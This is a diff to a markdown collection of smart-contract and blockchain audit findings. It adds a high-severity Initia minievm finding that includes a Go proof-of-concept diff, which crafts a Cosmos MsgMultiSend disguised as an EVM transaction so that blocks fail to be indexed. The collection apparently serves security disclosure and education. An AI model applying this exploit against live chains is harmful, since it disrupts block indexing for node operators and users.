@@ -554,22 +554,334 @@ contract PreimageOracle_LargePreimageProposals_Test is Test {
 ```cairo
 
     async def test_ripemd160_on_55_length_input(self, cairo_run):
-
         msg_bytes = bytes("abcdbcdecdefdefgefghfghighijhijkijkljklmklmnlmomnopnopq", "ascii")
-
         precompile_hash = cairo_run("test__ripemd160", msg=list(msg_bytes))
 
-
         # Hash with RIPEMD-160 to compare with precompile result
-
         ripemd160_crypto = RIPEMD160.new()
-
         ripemd160_crypto.update(msg_bytes)
-
         expected_hash = ripemd160_crypto.hexdigest()
 
-
         assert expected_hash.rjust(64, "0") == bytes(precompile_hash).hex()
+```
+
+</details>
+
+## 12. [High] A regular Cosmos SDK message can be disguised as an EVM transaction, causing ListenFinalizeBlock to error which prevents the block from being indexed
+
+### Block indexing failures
+
+- Summary: In Initia’s `minievm` module, a vulnerability was found where a regular Cosmos SDK message (e.g., `MsgMultiSend`) could be disguised as an EVM transaction by using the Ethereum signing mode (`SIGN_MODE_ETHEREUM`). This caused `ConvertCosmosTxToEthereumTx` to mistakenly treat it as a valid EVM transaction. During block finalization, `ListenFinalizeBlock` would try to extract logs assuming an EVM transaction, but fail when the type URL didn't match, causing an error that stopped the entire block from being indexed. This led to missing blocks in JSON-RPC queries, skipped pruning, and missing bloom filters.
+
+- Impact & Recommendation: The issue was fixed by adding stricter type URL checks in `ConvertCosmosTxToEthereumTx`.
+  <br> 🐬: [Source](https://code4rena.com/reports/2025-02-initia-cosmos#h-02-a-regular-cosmos-sdk-message-can-be-disguised-as-an-evm-transaction-causing-listenfinalizeblock-to-error-which-prevents-the-block-from-being-indexed) & [Report](https://code4rena.com/reports/2025-02-initia-cosmos)
+
+<details><summary>POC</summary>
+
+```go
+
+diff --git a/app/ante/verify.go b/app/ante/verify.go
+index 6381af1..bd054a9 100644
+--- a/app/ante/verify.go
++++ b/app/ante/verify.go
+@@ -70,7 +70,8 @@ func verifySignature(
+ 			if err != nil {
+ 				return errorsmod.Wrapf(sdkerrors.ErrorInvalidSigner, "failed to recover sender address: %v", err)
+ 			}
+-
++			fmt.Println("expected sender", expectedSender)
++			fmt.Println("recover sender", sender.String())
+ 			// check if the recovered sender matches the expected sender
+ 			if expectedSender == nil || *expectedSender != sender {
+ 				return errorsmod.Wrapf(sdkerrors.ErrorInvalidSigner, "expected sender %s, got %s", expectedSender, sender)
+diff --git a/indexer/abci_test.go b/indexer/abci_test.go
+index b3895ea..7051fe4 100644
+--- a/indexer/abci_test.go
++++ b/indexer/abci_test.go
+@@ -2,17 +2,24 @@ package indexer_test
+
+
+ import (
+ 	"context"
++	"crypto/ecdsa"
+ 	"math/big"
+ 	"sync"
+ 	"testing"
+
+
++	"cosmossdk.io/collections"
++	coretypes "github.com/ethereum/go-ethereum/core/types"
++	"github.com/ethereum/go-ethereum/crypto"
++	"github.com/initia-labs/initia/crypto/ethsecp256k1"
+ 	"github.com/stretchr/testify/require"
+
+
+-	"github.com/initia-labs/minievm/tests"
+-	evmtypes "github.com/initia-labs/minievm/x/evm/types"
+-
++	sdk "github.com/cosmos/cosmos-sdk/types"
+ 	"github.com/ethereum/go-ethereum/common"
+ 	"github.com/ethereum/go-ethereum/common/hexutil"
++	minitiaapp "github.com/initia-labs/minievm/app"
++	"github.com/initia-labs/minievm/tests"
++	evmkeeper "github.com/initia-labs/minievm/x/evm/keeper"
++	evmtypes "github.com/initia-labs/minievm/x/evm/types"
+ )
+
+
+ func Test_ListenFinalizeBlock(t *testing.T) {
+@@ -62,6 +69,80 @@ func Test_ListenFinalizeBlock(t *testing.T) {
+
+ }
+
+
++func CustomGenerateETHTx(t *testing.T, app *minitiaapp.MinitiaApp, privKey *ecdsa.PrivateKey, opts ...tests.Opt) (sdk.Tx, common.Hash) {
++	value := new(big.Int).SetUint64(0)
++
++	ctx, err := app.CreateQueryContext(0, false)
++	require.NoError(t, err)
++
++	gasLimit := new(big.Int).SetUint64(1_000_000)
++	gasPrice := new(big.Int).SetUint64(1_000_000_000)
++
++	ethChainID := evmtypes.ConvertCosmosChainIDToEthereumChainID(ctx.ChainID())
++	dynamicFeeTx := &coretypes.DynamicFeeTx{
++		ChainID:    ethChainID,
++		Nonce:      1,
++		GasTipCap:  big.NewInt(0),
++		GasFeeCap:  gasPrice,
++		Gas:        gasLimit.Uint64(),
++		To:         nil,
++		Data:       nil,
++		Value:      value,
++		AccessList: coretypes.AccessList{},
++	}
++	for _, opt := range opts {
++		opt(dynamicFeeTx)
++	}
++	if dynamicFeeTx.Nonce == 0 {
++		cosmosKey := ethsecp256k1.PrivKey{Key: crypto.FromECDSA(privKey)}
++		addrBz := cosmosKey.PubKey().Address()
++		dynamicFeeTx.Nonce, err = app.AccountKeeper.GetSequence(ctx, sdk.AccAddress(addrBz))
++		require.NoError(t, err)
++	}
++
++	ethTx := coretypes.NewTx(dynamicFeeTx)
++	signer := coretypes.LatestSignerForChainID(ethChainID)
++	signedTx, err := coretypes.SignTx(ethTx, signer, privKey)
++	require.NoError(t, err)
++
++	// Convert to cosmos tx using the custom method which uses a bank multi send message instead
++	sdkTx, err := evmkeeper.NewTxUtils(app.EVMKeeper).CustomConvertEthereumTxToCosmosTx(ctx, signedTx)
++	require.NoError(t, err)
++
++	return sdkTx, signedTx.Hash()
++}
++
++func Test_ListenFinalizeBlock_Audit_Errors(t *testing.T) {
++	app, _, privKeys := tests.CreateApp(t)
++	indexer := app.EVMIndexer()
++	defer app.Close()
++
++	// Create regular (victim) tx
++	victimTx, victimEvmTxHash := tests.GenerateCreateERC20Tx(t, app, privKeys[0])
++
++	// Create malicious tx
++	tx, evmTxHash := CustomGenerateETHTx(t, app, privKeys[0])
++
++	// Execute both tx's and verify they are successful
++	_, finalizeRes := tests.ExecuteTxs(t, app, victimTx, tx)
++	tests.CheckTxResult(t, finalizeRes.TxResults[0], true)
++	tests.CheckTxResult(t, finalizeRes.TxResults[1], true)
++
++	ctx, err := app.CreateQueryContext(0, false)
++	require.NoError(t, err)
++
++	// check the tx's are both not indexed
++	victimEvmTx, err := indexer.TxByHash(ctx, victimEvmTxHash)
++	require.ErrorIs(t, err, collections.ErrNotFound)
++	require.Nil(t, victimEvmTx)
++
++	evmTx, err := indexer.TxByHash(ctx, evmTxHash)
++	require.ErrorIs(t, err, collections.ErrNotFound)
++	require.Nil(t, evmTx)
++
++	require.False(t, true)
++}
++
+ func Test_ListenFinalizeBlock_Subscribe(t *testing.T) {
+ 	app, _, privKeys := tests.CreateApp(t)
+ 	indexer := app.EVMIndexer()
+diff --git a/x/bank/keeper/msg_server.go b/x/bank/keeper/msg_server.go
+index 8bf9276..5938e36 100644
+--- a/x/bank/keeper/msg_server.go
++++ b/x/bank/keeper/msg_server.go
+@@ -4,8 +4,6 @@ import (
+ 	"context"
+
+
+ 	"github.com/hashicorp/go-metrics"
+-	"google.golang.org/grpc/codes"
+-	"google.golang.org/grpc/status"
+
+
+ 	errorsmod "cosmossdk.io/errors"
+ 	"github.com/cosmos/cosmos-sdk/telemetry"
+@@ -85,7 +83,7 @@ func (k msgServer) Send(goCtx context.Context, msg *types.MsgSend) (*types.MsgSe
+ }
+
+ func (k msgServer) MultiSend(goCtx context.Context, msg *types.MsgMultiSend) (*types.MsgMultiSendResponse, error) {
+-	return nil, status.Errorf(codes.Unimplemented, "not supported")
++	return nil, nil
+ }
+
+ func (k msgServer) UpdateParams(goCtx context.Context, req *types.MsgUpdateParams) (*types.MsgUpdateParamsResponse, error) {
+diff --git a/x/evm/keeper/txutils.go b/x/evm/keeper/txutils.go
+index 4a4717c..0a3715f 100644
+--- a/x/evm/keeper/txutils.go
++++ b/x/evm/keeper/txutils.go
+
+@@ -13,6 +13,7 @@ import (
+ 	"github.com/cosmos/cosmos-sdk/types/tx/signing"
+ 	authsigning "github.com/cosmos/cosmos-sdk/x/auth/signing"
+ 	authtx "github.com/cosmos/cosmos-sdk/x/auth/tx"
++	banktypes "github.com/cosmos/cosmos-sdk/x/bank/types"
+
+
+ 	"github.com/ethereum/go-ethereum/common"
+ 	"github.com/ethereum/go-ethereum/common/hexutil"
+@@ -181,6 +182,129 @@ func (u *TxUtils) ConvertEthereumTxToCosmosTx(ctx context.Context, ethTx *corety
+ 	return txBuilder.GetTx(), nil
+ }
+
+
++func (u *TxUtils) CustomConvertEthereumTxToCosmosTx(ctx context.Context, ethTx *coretypes.Transaction) (sdk.Tx, error) {
++	params, err := u.Params.Get(ctx)
++	if err != nil {
++		return nil, err
++	}
++
+
++	feeDenom := params.FeeDenom
++	decimals, err := u.ERC20Keeper().GetDecimals(ctx, feeDenom)
++	if err != nil {
++		return nil, err
++	}
++
++	gasFeeCap := ethTx.GasFeeCap()
++	if gasFeeCap == nil {
++		gasFeeCap = big.NewInt(0)
++	}
++	gasTipCap := ethTx.GasTipCap()
++	if gasTipCap == nil {
++		gasTipCap = big.NewInt(0)
++	}
++
++	// convert gas fee unit from wei to cosmos fee unit
++	gasLimit := ethTx.Gas()
++	gasFeeAmount := computeGasFeeAmount(gasFeeCap, gasLimit, decimals)
++	feeAmount := sdk.NewCoins(sdk.NewCoin(params.FeeDenom, math.NewIntFromBigInt(gasFeeAmount)))
++
++	// convert value unit from wei to cosmos fee unit
++	value := types.FromEthersUnit(decimals, ethTx.Value())
++
++	// check if the value is correctly converted without dropping any precision
++	if types.ToEthersUint(decimals, value).Cmp(ethTx.Value()) != 0 {
++		return nil, types.ErrInvalidValue.Wrap("failed to convert value to token unit without dropping precision")
++	}
++
++	// signer
++	chainID := sdk.UnwrapSDKContext(ctx).ChainID()
++	ethChainID := types.ConvertCosmosChainIDToEthereumChainID(chainID)
++	signer := coretypes.LatestSignerForChainID(ethChainID)
++
++	// get tx sender
++	ethSender, err := coretypes.Sender(signer, ethTx)
++	if err != nil {
++		return nil, err
++	}
++	// sig bytes
++	v, r, s := ethTx.RawSignatureValues()
++	sigBytes := make([]byte, 65)
++	switch ethTx.Type() {
++	case coretypes.LegacyTxType:
++		sigBytes[64] = byte(new(big.Int).Sub(v, new(big.Int).Add(new(big.Int).Add(ethChainID, ethChainID), big.NewInt(35))).Uint64())
++	case coretypes.AccessListTxType, coretypes.DynamicFeeTxType:
++		sigBytes[64] = byte(v.Uint64())
++	default:
++		return nil, sdkerrors.ErrorInvalidSigner.Wrapf("unsupported tx type: %d", ethTx.Type())
++	}
++
++	copy(sigBytes[32-len(r.Bytes()):32], r.Bytes())
++	copy(sigBytes[64-len(s.Bytes()):64], s.Bytes())
++
++	sigData := &signing.SingleSignatureData{
++		SignMode:  SignMode_SIGN_MODE_ETHEREUM,
++		Signature: sigBytes,
++	}
++
++	// recover pubkey
++	pubKeyBz, err := crypto.Ecrecover(signer.Hash(ethTx).Bytes(), sigBytes)
++	if err != nil {
++		return nil, sdkerrors.ErrorInvalidSigner.Wrapf("failed to recover pubkey: %v", err.Error())
++	}
++
++	// compress pubkey
++	compressedPubKey, err := ethsecp256k1.NewPubKeyFromBytes(pubKeyBz)
++	if err != nil {
++		return nil, sdkerrors.ErrorInvalidSigner.Wrapf("failed to create pubkey: %v", err.Error())
++	}
++
++	// construct signature
++	sig := signing.SignatureV2{
++		PubKey:   compressedPubKey,
++		Data:     sigData,
++		Sequence: ethTx.Nonce(),
++	}
++
++	// convert sender to string
++	sender, err := u.ac.BytesToString(ethSender.Bytes())
++	if err != nil {
++		return nil, err
++	}
++
++	sdkMsgs := []sdk.Msg{}
++
++	// add `MultiSend` bank message
++	sdkMsgs = append(sdkMsgs, &banktypes.MsgMultiSend{
++		Inputs: []banktypes.Input{
++			{Address: sender, Coins: sdk.NewCoins(sdk.NewCoin(feeDenom, math.NewIntFromBigInt(value)))},
++		},
++		Outputs: []banktypes.Output{},
++	})
++
++	txBuilder := authtx.NewTxConfig(u.cdc, authtx.DefaultSignModes).NewTxBuilder()
++	if err = txBuilder.SetMsgs(sdkMsgs...); err != nil {
++		return nil, err
++	}
++	txBuilder.SetFeeAmount(feeAmount)
++	txBuilder.SetGasLimit(gasLimit)
++	if err = txBuilder.SetSignatures(sig); err != nil {
++		return nil, err
++	}
++
++	// set memo
++	memo, err := json.Marshal(metadata{
++		Type:      ethTx.Type(),
++		GasFeeCap: gasFeeCap.String(),
++		GasTipCap: gasTipCap.String(),
++	})
++	if err != nil {
++		return nil, err
++	}
++	txBuilder.SetMemo(string(memo))
++
++	return txBuilder.GetTx(), nil
++}
++
+ type metadata struct {
+ 	Type      uint8  `json:"type"`
+ 	GasFeeCap string `json:"gas_fee_cap"`
 
 ```
 
